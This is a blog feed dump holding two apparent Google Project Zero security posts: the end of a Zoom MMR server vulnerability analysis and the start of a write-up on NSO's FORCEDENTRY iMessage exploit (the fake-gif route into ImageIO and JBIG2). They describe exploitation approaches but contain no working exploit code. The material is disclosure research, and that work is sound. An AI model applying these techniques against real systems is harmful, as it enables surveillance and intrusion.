class=\"c2\"&gt;This bug allows the attacker to provide a string of any size, which then gets copied out of bounds up until a null character is encountered in memory, and then returned. It is possible for CVE-2021-34424 to return a heap pointer, as the MMR maps the heap that gets corrupted at a low address that does not usually contain null bytes, however, I could not find a way to force a specific heap pointer to be allocated next to the string buffer that gets copied out of bounds. C++ objects used by the MMR tend to be virtual objects, so the first 64 bits of most object allocations are a vtable which contains null bytes, ending the copy. Other allocated structures, especially larger ones, tend to contain non-pointer data. I was able to get this bug to return heap pointers by specifying a string that was less than 64 bits long, so the nearby allocations were sometimes the pointers themselves, but allocations of this size are so frequent it was not possible to ascertain what heap data they pointed to with any accuracy.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;One last idea I had was to use another type confusion bug to leak a pointer to a controllable buffer. There is one such &lt;/span&gt;&lt;span&gt;bug&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the processing of deserialized &lt;/span&gt;&lt;span class=\"c6\"&gt;ssb::kv_update_req&lt;/span&gt;&lt;span&gt;&amp;nbsp;objects. This object&amp;rsquo;s &lt;/span&gt;&lt;span class=\"c6\"&gt;ssb::dyna_para_table_t &lt;/span&gt;&lt;span&gt;table contains a variant named &lt;/span&gt;&lt;span class=\"c6\"&gt;nodeid&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;which represents the specific Zoom client that the message refers to. If an attacker changes this variant to be of type array instead of a 32-bit integer, the address of the pointer to this array will be logged as a string. I tried to combine CVE-2021-34424 with this bug, hoping that it might be possible for the leaked data to be this log string that contains pointer information. Unfortunately, I wasn&amp;rsquo;t able to get this to work because of timing: the log entry needs to be logged at almost exactly the same time as the bug is triggered so that the log data is still in memory, and I wasn&amp;#39;t able to send packets fast enough. I suspect it might be possible for this to work with improved automation, as I was relying on clients hooked with Frida and browsers to interact with the Zoom server, but I decided not to pursue this as it would require tooling that would take substantial effort to develop.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c13\" id=\"h.oicfsqzplw6\"&gt;&lt;span class=\"c10\"&gt;Conclusion&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;I performed a security analysis of Zoom and reported two vulnerabilities. One was a buffer overflow that affected both Zoom clients and MMR servers, and one was an info leak that is only useful to attackers on MMR servers. Both of these vulnerabilities were fixed on November 24, 2021. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c2\"&gt;The vulnerabilities in Zoom&amp;rsquo;s MMR server are especially concerning, as this server processes meeting audio and video content, so a compromise could allow an attacker to monitor any Zoom meetings that do not have end-to-end encryption enabled. While I was not successful in exploiting these vulnerabilities, I was able to use them to perform many elements of exploitation, and I believe that an attacker would be able to exploit them with sufficient investment. The lack of ASLR in the Zoom MMR process greatly increased the risk that an attacker could compromise it, and it is positive that Zoom has recently enabled it. That said, if vulnerabilities similar to the ones that I reported still exist in the MMR server, it is likely that an attacker could bypass it, so it is also important that Zoom continue to improve the robustness of the MMR code. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;It is also important to note that this research was possible because Zoom allows customers to set up their own servers, meanwhile no other video conferencing solution with proprietary servers that I have investigated allows this, so it is unclear how these results compare to other video conferencing platforms.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c2\"&gt;Overall, while the client bugs that were discovered during this research were comparable to what Project Zero has found in other videoconferencing platforms, the server bugs were surprising, especially when the server lacked ASLR and supports modes of operation that are not end-to-end encrypted. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;There are a few factors that commonly lead to security problems in videoconferencing applications that contributed to these bugs in Zoom. One is the huge amount of code included in Zoom. There were large portions of code that I couldn&amp;rsquo;t determine the functionality of, and many of the classes that could be deserialized didn&amp;rsquo;t appear to be commonly used. This both increases the difficulty of security research and increases the attack surface by making more code that could potentially contain vulnerabilities available to attackers. In addition, Zoom uses many proprietary formats and protocols which meant that understanding the attack surface of the platform and creating the tooling to manipulate specific interfaces was very time consuming. Using the features we tested also required paying roughly $1500 USD in licensing fees. These barriers to security research likely mean that Zoom is not investigated as often as it could be, potentially leading to simple bugs going undiscovered. &amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c2\"&gt;Still, my largest concern in this assessment was the lack of ASLR in the Zoom MMR server. ASLR is arguably the most important mitigation in preventing exploitation of memory corruption, and most other mitigations rely on it on some level to be effective. There is no good reason for it to be disabled in the vast majority of software. There has recently been a push to reduce the susceptibility of software to memory corruption vulnerabilities by moving to memory-safe languages and implementing enhanced memory mitigations, but this relies on vendors using the security measures provided by the platforms they write software for. All software written for platforms that support ASLR should have it (and other basic memory mitigations) enabled.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;The closed nature of Zoom also impacted this analysis greatly. Most video conferencing systems use open-source software, either WebRTC or PJSIP. While these platforms are not free of problems, it&amp;rsquo;s easier for researchers, customers and vendors alike to verify their security properties and understand the risk they present because they are open. Closed-source software presents unique security challenges, and Zoom could do more to make their platform accessible to security researchers and others who wish to evaluate it. While the Zoom Security Team helped me access and configure server software, it is not clear that support is available to other researchers, and licensing the software was still expensive. &lt;/span&gt;&lt;span&gt;Zoom, and other companies that produce closed-source security-sensitive software should consider how to make their software accessible to security researchers. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;"},"link":[{"@rel":"replies","@type":"application/atom+xml","@href":"https://googleprojectzero.blogspot.com/feeds/1246610633949568195/comments/default","@title":"Post Comments"},{"@rel":"replies","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/01/zooming-in-on-zero-click-exploits.html#comment-form","@title":"0 Comments"},{"@rel":"edit","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/1246610633949568195"},{"@rel":"self","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/1246610633949568195"},{"@rel":"alternate","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/01/zooming-in-on-zero-click-exploits.html","@title":"Zooming in on Zero-click Exploits"}],"author":{"name":"Ryan","uri":"http://www.blogger.com/profile/17011901605865574886","email":"noreply@blogger.com","gd:image":{"@rel":"http://schemas.google.com/g/2005#thumbnail","@width":"16","@height":"16","@src":"https://img1.blogblog.com/img/b16-rounded.gif"}},"thr:total":"0"},{"id":"tag:blogger.com,1999:blog-4838136820032157985.post-5073082417618502919","published":"2021-12-15T09:00:00.001-08:00","updated":"2022-08-23T12:03:57.118-07:00","title":{"@type":"text","#text":"A deep dive into an NSO zero-click iMessage exploit: Remote Code Execution"},"content":{"@type":"html","#text":"&lt;style type=\"text/css\"&gt;@import url('https://themes.googleusercontent.com/fonts/css?kit=lhDjYqiy3mZ0x6ROQEUoUw');ol{margin:0;padding:0}table td,table th{padding:0}.c13{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#b7b7b7;border-top-width:1pt;border-right-width:1pt;border-left-color:#b7b7b7;vertical-align:top;border-right-color:#b7b7b7;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#b7b7b7;border-bottom-style:solid}.c0{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Courier New\";font-style:normal}.c5{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\";font-style:normal}.c20{padding-top:20pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c19{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:20pt;font-family:\"Arial\";font-style:normal}.c1{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:right;height:11pt}.c4{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:center}.c14{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\";font-style:normal}.c3{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c9{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\"}.c12{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:right}.c23{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.c22{border-spacing:0;border-collapse:collapse;margin-right:auto}.c21{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c16{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c17{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c2{color:inherit;text-decoration:inherit}.c15{font-weight:400;font-family:Consolas,\"Courier New\"}.c6{font-weight:400;font-family:\"Courier New\"}.c8{font-weight:700}.c11{height:0pt}.c7{font-style:italic}.c10{height:11pt}.c18{background-color:#00ff00}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:\"Arial\"}p{margin:0;color:#000000;font-size:11pt;font-family:\"Arial\"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class=\"c17\"&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c5\"&gt;Posted by Ian Beer &amp;amp; Samuel Gro&amp;szlig; of Google Project Zero&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7\"&gt;We want to thank Citizen Lab for sharing a sample of the FORCEDENTRY exploit with us, and Apple&amp;rsquo;s Security Engineering and Architecture (SEAR) group for collaborating with us on the technical analysis. The editorial opinions reflected below are solely Project Zero&amp;rsquo;s and do not necessarily reflect those of the organizations we collaborated with during this research. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;Earlier this year, Citizen Lab managed to capture an NSO iMessage-based zero-click exploit being used to target a Saudi activist.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In this two-part blog post series we will describe &lt;/span&gt;&lt;span&gt;for the first time&lt;/span&gt;&lt;span&gt;&amp;nbsp;how an in-the-wild zero-click iMessage exploit works.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;Based on our research and findings, we &lt;/span&gt;&lt;span&gt;assess&lt;/span&gt;&lt;span&gt;&amp;nbsp;this to be &lt;/span&gt;&lt;span&gt;one of the most technically sophisticated exploits we&amp;#39;ve ever seen, further&lt;/span&gt;&lt;span&gt;&amp;nbsp;demonstrating &lt;/span&gt;&lt;span&gt;that the capabilities NSO provides rival those previously thought to be accessible to only a handful of nation states.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;The vulnerability discussed in this blog post was fixed on September 13, 2021 in &lt;/span&gt;&lt;span class=\"c16\"&gt;&lt;a class=\"c21\" href=\"https://support.apple.com/en-us/HT212807\"&gt;iOS 14.8&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;as CVE-2021-30860.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c14 c8\"&gt;NSO&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c16\"&gt;&lt;a class=\"c21\" href=\"https://en.wikipedia.org/wiki/NSO_Group\"&gt;NSO&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c16\"&gt;&lt;a class=\"c21\" href=\"https://en.wikipedia.org/wiki/NSO_Group\"&gt;&amp;nbsp;Group&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;is&lt;/span&gt;&lt;span&gt;&amp;nbsp;one of the &lt;/span&gt;&lt;span class=\"c16\"&gt;&lt;a class=\"c21\" href=\"https://www.atlanticcouncil.org/in-depth-research-reports/report/countering-cyber-proliferation-zeroing-in-on-access-as-a-service/\"&gt;highest-profile providers of &amp;quot;access-as-a-service&amp;quot;&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, selling packaged hacking solutions which &lt;/span&gt;&lt;span class=\"c16\"&gt;&lt;a class=\"c21\" href=\"https://www.atlanticcouncil.org/in-depth-research-reports/issue-brief/surveillance-technology-at-the-fair/\"&gt;enable nation state actors without a home-grown offensive cyber capability to &amp;quot;pay-to-play&amp;quot;&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c5\"&gt;, vastly expanding the number of nations with such cyber capabilities.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;For years, groups like Citizen Lab and Amnesty International have been tracking the use of NSO&amp;#39;s mobile spyware package &amp;quot;Pegasus&amp;quot;. Despite NSO&amp;#39;s claims that they &amp;quot;&lt;/span&gt;&lt;span class=\"c16\"&gt;&lt;a class=\"c21\" href=\"https://www.nsogroup.com/governance/human-rights-policy/\"&gt;[evaluate] the potential for adverse human rights impacts arising from the misuse of NSO products&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;quot; Pegasus has been linked to &lt;/span&gt;&lt;span class=\"c16\"&gt;&lt;a class=\"c21\" href=\"https://citizenlab.ca/2020/01/stopping-the-press-new-york-times-journalist-targeted-by-saudi-linked-pegasus-spyware-operator/\"&gt;the hacking of the New York Times journalist Ben Hubbard by the Saudi regime&lt;/a&gt;&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;&lt;a class=\"c21\" href=\"https://www.amnesty.org/en/latest/research/2019/10/morocco-human-rights-defenders-targeted-with-nso-groups-spyware/\"&gt;hacking of human rights defenders in Morocco&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"c16\"&gt;&lt;a class=\"c21\" href=\"https://citizenlab.ca/2021/08/bahrain-hacks-activists-with-nso-group-zero-click-iphone-exploits/\"&gt;Bahrain&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"c16\"&gt;&lt;a class=\"c21\" href=\"https://www.amnesty.org/en/latest/research/2018/08/amnesty-international-among-targets-of-nso-powered-campaign/\"&gt;the targeting of Amnesty International staff&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c5\"&gt;&amp;nbsp;and dozens of other cases.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;Last month the United States added NSO to the &amp;quot;Entity List&amp;quot;, severely restricting the ability of US companies to do business with NSO and &lt;/span&gt;&lt;span class=\"c16\"&gt;&lt;a class=\"c21\" href=\"https://www.commerce.gov/news/press-releases/2021/11/commerce-adds-nso-group-and-other-foreign-companies-entity-list\"&gt;stating in a press release&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;that &amp;quot;[NSO&amp;#39;s tools] enabled foreign governments to conduct transnational repression, which is the practice of authoritarian governments targeting dissidents, journalists and activists outside of their sovereign borders to silence dissent.&amp;quot;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;Citizen Lab was able to recover these Pegasus exploits from an iPhone and therefore this analysis covers NSO&amp;#39;s capabilities against iPhone. We are aware that NSO sells similar zero-click capabilities which target Android devices; Project Zero&lt;/span&gt;&lt;span&gt;&amp;nbsp;does not have samples of these exploits&lt;/span&gt;&lt;span&gt;&amp;nbsp;but if you do, &lt;/span&gt;&lt;span&gt;please reach out.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c14 c8\"&gt;From One to Zero&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;In previous cases such as the &lt;/span&gt;&lt;span class=\"c16\"&gt;&lt;a class=\"c21\" href=\"https://citizenlab.ca/2016/08/million-dollar-dissident-iphone-zero-day-nso-group-uae/\"&gt;Million Dollar Dissident from 2016&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c5\"&gt;, targets were sent links in SMS messages:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;/p&gt;\n  \n &lt;p class=\"c3\"&gt;&lt;span class=\"c5\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvP0VlEQXC6TZWOu-zPOWC-Pnyy3uqOJpwPeP3Y_rz-ZO_MvrqjiMtMwxzIz_E8NdNyrV_Fvx-RRApoMxAPrYQcHO4eiico20He9zMm3UT5-j84CCRZDJq5hjMmeIKd0aLMsflCkfrfVHp1z1PbQmYPFX6UlVtn6_gF8P6iTQaAHL3EQ6iKs4VDdEZ/s870/image2%281%29.jpg\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvP0VlEQXC6TZWOu-zPOWC-Pnyy3uqOJpwPeP3Y_rz-ZO_MvrqjiMtMwxzIz_E8NdNyrV_Fvx-RRApoMxAPrYQcHO4eiico20He9zMm3UT5-j84CCRZDJq5hjMmeIKd0aLMsflCkfrfVHp1z1PbQmYPFX6UlVtn6_gF8P6iTQaAHL3EQ6iKs4VDdEZ/s870/image2%281%29.jpg\" border=\"0\" alt=\"\" style=\"max-height: 750px; max-width: 600px;\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c12\"&gt;&lt;span class=\"c9 c7\"&gt;Screenshots of Phishing SMSs reported to Citizen Lab in 2016&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c12\"&gt;&lt;span class=\"c7\"&gt;source: &lt;/span&gt;&lt;span class=\"c16 c7\"&gt;&lt;a class=\"c21\" href=\"https://citizenlab.ca/2016/08/million-dollar-dissident-iphone-zero-day-nso-group-uae/\"&gt;https://citizenlab.ca/2016/08/million-dollar-dissident-iphone-zero-day-nso-group-uae/&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;The target was only hacked when they clicked the link, a technique known as a one-click exploit. Recently, however, it has been documented that NSO is offering their clients zero-click exploitation technology, where even very technically savvy targets who might not click a phishing link are completely unaware they are being targeted. In the zero-click scenario no user interaction is required. Meaning, t&lt;/span&gt;&lt;span&gt;he attacker doesn&amp;#39;t need to send phishing messages; the exploit just works silently in the background&lt;/span&gt;&lt;span&gt;. Short of not using a device, t&lt;/span&gt;&lt;span&gt;here is no way to prevent exploitation by a zero-click exploit; it&amp;#39;s a weapon against which there is no defense&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c8\"&gt;One weird trick&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c5\"&gt;The initial entry point for Pegasus on iPhone is iMessage. This means that a victim can be targeted just using their phone number or AppleID username.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;iMessage has native support for GIF images, the typically small and low quality animated images popular in meme culture. You can send and receive GIFs in iMessage chats and they show up in the chat window. Apple wanted to make those GIFs loop endlessly rather than only play once, so very early on in the &lt;/span&gt;&lt;span class=\"c16\"&gt;&lt;a class=\"c21\" href=\"https://googleprojectzero.blogspot.com/2021/01/a-look-at-imessage-in-ios-14.html\"&gt;iMessage parsing and processing pipeline&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;(after a message has been received but well before the message is shown), iMessage calls the following method in the &lt;/span&gt;&lt;span class=\"c6\"&gt;IMTranscoderAgent&lt;/span&gt;&lt;span&gt;&amp;nbsp;process&lt;/span&gt;&lt;span&gt;&amp;nbsp;(outside the &amp;quot;BlastDoor&amp;quot; sandbox), passing any image file received with the extension &lt;/span&gt;&lt;span class=\"c15\"&gt;.gif&lt;/span&gt;&lt;span class=\"c5\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c15 c23\"&gt;&amp;nbsp; [IMGIFUtils copyGifFromPath:toDestinationPath:error]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;Looking at the selector name, the intention here was probably to just copy the GIF file before editing the loop count field, but the semantics of this method are different. Under the hood it uses the CoreGraphics APIs to &lt;/span&gt;&lt;span class=\"c7\"&gt;render&lt;/span&gt;&lt;span&gt;&amp;nbsp;the source image to a &lt;/span&gt;&lt;span class=\"c7\"&gt;new&lt;/span&gt;&lt;span&gt;&amp;nbsp;GIF file at the destination path. And just because the source filename has to end in &lt;/span&gt;&lt;span class=\"c15\"&gt;.gif&lt;/span&gt;&lt;span class=\"c5\"&gt;, that doesn&amp;#39;t mean it&amp;#39;s really a GIF file.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;The ImageIO library, &lt;/span&gt;&lt;span class=\"c16\"&gt;&lt;a class=\"c21\" href=\"https://googleprojectzero.blogspot.com/2020/04/fuzzing-imageio.html\"&gt;as detailed in a previous Project Zero blogpost&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c5\"&gt;, is used to guess the correct format of the source file and parse it, completely ignoring the file extension. Using this &amp;quot;fake gif&amp;quot; trick, over 20 image codecs are suddenly part of the iMessage zero-click attack surface, including some very obscure and complex formats, remotely exposing probably hundreds of thousands of lines of code. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c5\"&gt;Note: Apple inform us that they have restricted the available ImageIO formats reachable from IMTranscoderAgent starting in iOS 14.8.1 (26 October 2021), and completely removed the GIF code path from IMTranscoderAgent starting in iOS 15.0 (20 September 2021), with GIF decoding taking place entirely within BlastDoor.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c8\"&gt;A PDF in your GIF&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c5\"&gt;NSO uses the &amp;quot;fake gif&amp;quot; trick to target a vulnerability in the CoreGraphics PDF parser.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;PDF was a popular target for exploitation around a decade ago, due to its ubiquity and complexity. Plus, the availability of javascript inside PDFs made development of reliable exploits far easier. The CoreGraphics PDF parser doesn&amp;#39;t &lt;/span&gt;&lt;span class=\"c7\"&gt;seem&lt;/span&gt;&lt;span class=\"c5\"&gt;&amp;nbsp;to interpret javascript, but NSO managed to find something equally powerful inside the CoreGraphics PDF parser...&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c14 c8\"&gt;Extreme compression&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;In the late 1990&amp;#39;s, bandwidth and storage were much more scarce than they are now. It was in that environment that the &lt;/span&gt;&lt;span class=\"c16\"&gt;&lt;a class=\"c21\" href=\"https://en.wikipedia.org/wiki/JBIG2\"&gt;JBIG2&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c5\"&gt;&amp;nbsp;standard emerged. JBIG2 is a domain specific image codec designed to compress images where pixels can only be black or white.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;It was developed to achieve extremely high compression ratios for scans of text documents and was implemented and used in high-end office scanner/printer devices like the XEROX WorkCenter device shown below. If you used the &lt;/span&gt;&lt;span class=\"c7\"&gt;scan to pdf&lt;/span&gt;&lt;span&gt;&amp;nbsp;functionality of a device like this a decade ago, your PDF likely had a JBIG2 stream in it.&lt;/span&gt;&lt;span class=\"c5\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj3gos8L_dEuVS2ltgPw-T3WxC6COMIyYoq4DlSN8Z8XgNueXzXBBlQF_BusBrKSJowwIu0OouJLMwZwPZyMiORoXCShUtbb65C3ZkKU9Tzo8ANc5862ImuSa9v1pjcjxR2v4T-UdpMYlV7DEsVgr43Mj3yAjHn_EXcxVxXFhxHqq1QXoEdP3S1JnRm/s700/image10.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img 